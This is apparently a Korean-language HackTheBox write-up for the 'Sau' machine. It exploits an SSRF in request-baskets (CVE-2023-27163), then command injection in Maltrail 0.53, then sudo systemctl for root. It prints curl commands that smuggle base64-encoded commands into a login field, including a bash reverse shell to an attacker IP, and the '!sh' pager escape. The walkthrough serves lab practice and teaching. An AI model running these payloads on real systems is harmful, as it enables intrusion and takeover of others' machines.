# Sau - HackTheBox
## Recon
- 80,8338포트 필터링.
<img width="1104" height="103" alt="image" src="https://github.com/user-attachments/assets/c3846a6f-7179-48c9-aea1-a310a1a12b70" />

<br>
<br>

```bash
sudo nmap -p 22,80,8338,5555 -sC -sV -vv -oA sau 10.10.11.224
```
<img width="1105" height="477" alt="image" src="https://github.com/user-attachments/assets/af0e5231-7dc5-4479-90a0-c65256b43e97" />

- SSH(22)
- HTTP(55555)

---
## HTTP
### banner grabbing
```bash
whatweb http://10.10.11.224:55555

curl -IL http://10.10.11.224:55555
```
<img width="1105" height="291" alt="image" src="https://github.com/user-attachments/assets/e00b92fa-704b-461c-984e-0479304d522e" />

### CVE-2023-27163
- 서버 하단에서 `request-baskets 1.2.1`을 발견.
<img width="329" height="75" alt="image" src="https://github.com/user-attachments/assets/f89fb5f1-fdbc-494d-bc6a-1f822dca95d1" />

<br>
<br>

- 해당 버전까지 SSRF 취약점 존재.
- https://nvd.nist.gov/vuln/detail/CVE-2023-27163
<img width="1100" height="133" alt="image" src="https://github.com/user-attachments/assets/adb95566-c90c-4bfd-93d5-be2ed903dae7" />

<br>
<br>

- https://github.com/entr0pie/CVE-2023-27163/blob/main/CVE-2023-27163.sh
- 해당 스크립트의 내용을 살펴보니 데이터를 설정해서 새로운 baskets를 만드는 과정.
<img width="1100" height="220" alt="image" src="https://github.com/user-attachments/assets/00c3eb4f-9ad0-4cc2-bb69-c8aa74f3f03b" />

<br>
<br>

- `9hnmdm7`이름의새로운 바스켓을 생성.
<img width="1100" height="288" alt="image" src="https://github.com/user-attachments/assets/d40f65d5-257d-455f-b2db-bee8e8136a81" />

<br>
<br>

- 80번 포트가 필터링된 것을 알기에 `settings`에서 `Forward URL`을 해당 서버의 80번포트로 향하도록 설정.
<img width="1100" height="426" alt="image" src="https://github.com/user-attachments/assets/17f85d31-2392-477e-a3cc-c33c084b60a9" />

<br>
<br>

- `burpsuite`에서 가로채서 확인해보니 스크립트의 내용처럼 전달이 되는 것을 확인.
<img width="772" height="418" alt="image" src="https://github.com/user-attachments/assets/5a42bf94-7a42-4da4-a1aa-fe06e1fc9689" />

---
## Maltrail RCE
- `http://10.10.11.224:55555/9hnmdm7`로 접속하면 해당 서버의 80번 포트로 패킷이 전달되는 것을 확인할 수 있음.
- `Maltrail 0.53`발견.
<img width="1100" height="602" alt="image" src="https://github.com/user-attachments/assets/0d31f362-3b06-4d76-9ea1-790e53794121" />

<br>
<br>

- https://github.com/spookier/Maltrail-v0.53-Exploit
- `/login`에 패킷을 전달하여 명령어를 실행할 수 있는 취약점.
<img width="950" height="280" alt="image" src="https://github.com/user-attachments/assets/a6e64123-8c5e-48e9-a0b3-5e7417e2cf07" />

<br>
<br>

- 핑 테스트 페이로드 생성하여 시도.
```bash
echo -n 'ping 10.10.16.4' |base64 -w0
```
<img width="1103" height="79" alt="image" src="https://github.com/user-attachments/assets/9f209204-aa7e-4adb-8180-2c8e50dc6b62" />

<br>
<br>

```bash
curl http://10.10.11.224:55555/9hnmdm7/login -d 'username=;`echo cGluZyAxMC4xMC4xNi40|base64 -d|bash`'
```
<img width="1103" height="53" alt="image" src="https://github.com/user-attachments/assets/5d56ef58-3565-4a49-b97a-a04d23d5cfb3" />

<br>
<br>

<img width="1103" height="193" alt="image" src="https://github.com/user-attachments/assets/3cec4ad1-2d92-4497-9723-a57ed9acd397" />

<br>
<br>

- 리버스 셸 페이로드 생성하여 전달.
```bash
echo -n 'bash  -i  >&/dev/tcp/10.10.16.4/80 0>&1'|base64 -w0
```
<img width="1103" height="76" alt="image" src="https://github.com/user-attachments/assets/96c9b02e-d746-4972-aa12-24432d1f7f49" />

<br>
<br>

```bash
curl http://10.10.11.224:55555/9hnmdm7/login -d 'username=;`echo YmFzaCAgLWkgID4mL2Rldi90Y3AvMTAuMTAuMTYuNC84MCAwPiYx|base64 -d|bash`'
```
<img width="1103" height="66" alt="image" src="https://github.com/user-attachments/assets/97f539a8-a44f-4dc3-b440-721a8b1eb259" />

<br>
<br>

- 셸 획득.
<img width="1105" height="182" alt="image" src="https://github.com/user-attachments/assets/51603387-f227-44f0-b4f3-c147d124cc99" />

---
## Privesc
- `systemctl`이 `root`권한으로 실행할 수 있도록 되어있음.
```bash
sudo -l
```
<img width="1105" height="138" alt="image" src="https://github.com/user-attachments/assets/c8587049-7770-475a-acbe-465f0a7c3176" />

<br>
<br>

- `root`권한으로 해당 명령어를 실행하면 `trail.service`에 대한 상태가 나온다.
```bash
sudo /usr/bin/systemctl status trail.service
```
<img width="1105" height="540" alt="image" src="https://github.com/user-attachments/assets/60cb0375-2a8d-44b3-97a9-bdc4abafd7bb" />

<br>
<br>

- https://gtfobins.github.io/gtfobins/systemctl/
- 출력되는 상태가 `less`와 같음을 확인.
<img width="976" height="172" alt="image" src="https://github.com/user-attachments/assets/ecbb93b8-b7fe-4d47-bf64-17ef8e795068" />

<br>
<br>

- `!sh`를 입력.
<img width="1103" height="127" alt="image" src="https://github.com/user-attachments/assets/a613d574-6f0f-4b96-b4aa-740077038f51" />

<br>
<br>

- `root` 셸 획득.
<img width="1103" height="43" alt="image" src="https://github.com/user-attachments/assets/ba433a86-269e-411a-a99b-6b50044592da" />

---
## FLAG
- `/home/puma/user.txt`
<img width="1103" height="248" alt="image" src="https://github.com/user-attachments/assets/ac41b24b-71ed-448c-b3a0-a0dbac92be02" />

<br>
<br>

- `/root/root.txt`
<img width="1103" height="287" alt="image" src="https://github.com/user-attachments/assets/77ac3b09-c975-4074-88f1-dc1bc6463f9d" />





















